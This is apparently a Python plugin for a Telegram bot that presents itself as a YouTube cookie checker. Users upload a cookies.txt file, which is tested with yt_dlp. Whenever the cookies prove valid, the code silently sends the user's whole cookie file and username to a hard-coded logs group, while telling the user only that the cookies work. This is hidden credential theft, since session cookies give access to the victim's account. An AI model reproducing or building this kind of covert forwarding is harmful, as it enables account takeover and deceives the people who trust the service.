import yt_dlp
import os
from datetime import datetime
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message

# Tracking Users Who Used /chkcookies
active_users = set()

# Logs Group ID (Cookies file waha send hogi)
LOGS_GROUP_ID = -1002300353707  

# Stylish Symbols & Fonts for VIP Look
BULLET = "➤"
CHECK = "✅"
CROSS = "❌"
CLOCK = "⏳"
SHIELD = "🛡"
FIRE = "🔥"
STAR = "⭐"
USER = "👤"
TIME = "⏰"

# Step 1: Enable Checking with `/chkcookies`
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    active_users.add(message.chat.id)
    await message.reply(f"{CHECK} ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ `tcookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ! {CLOCK}")

# Step 2: Accept Only If `/chkcookies` was Used
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    if message.chat.id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply(f"{CROSS} ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ `cookies.txt` ғɪʟᴇ!")
        return

    # Step 3: Read Cookies File
    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply(f"{CROSS} ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ɪs ᴇᴍᴘᴛʏ !")
            os.remove(file_path)  # Delete temp file
            return

        # Step 4: Get User Info & Time
        user_name = message.from_user.username
        full_name = message.from_user.first_name
        display_name = f"@{user_name}" if user_name else full_name
        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")  # Format: DD-MM-YYYY HH:MM AM/PM

        # Step 5: Validate YouTube Cookies
        ydl_opts = {"quiet": True, "cookiefile": file_path}

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = f"{CHECK} ʏᴏᴜʀ ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ᴠᴀʟɪᴅ ! "
            log_msg = f"""
{SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
{BULLET} {CHECK} ʀᴇsᴜʟᴛ: ᴡᴏʀᴋɪɴɢ {CHECK}
{BULLET} {USER} User: {display_name}
{BULLET} {TIME} ᴄʜᴇᴄᴋᴇᴅ ᴀᴛ : {check_time}
"""

            # Send valid cookies to group
            await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = f"{CROSS} Your YouTube cookies are invalid or expired !"
            log_msg = f"""
{SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
{BULLET} {CROSS} ʀᴇsᴜʟᴛ: ɪɴᴠᴀʟɪᴅ {CROSS}
{BULLET} {USER} ᴜsᴇʀ: {display_name}
{BULLET} {TIME} ᴄʜᴇᴄᴋᴇᴅ ᴀᴛ: {check_time}
"""
        # Send only log (without file) to group
        await client.send_message(LOGS_GROUP_ID, log_msg)
        await message.reply(msg, quote=True)

    except Exception as e:
        await message.reply(f"⚠️ Error reading file: `{str(e)}`")

    # Step 6: Clean Up Temporary File
    os.remove(file_path)

    # Step 7: Remove User from Active List
    active_users.remove(message.chat.id)
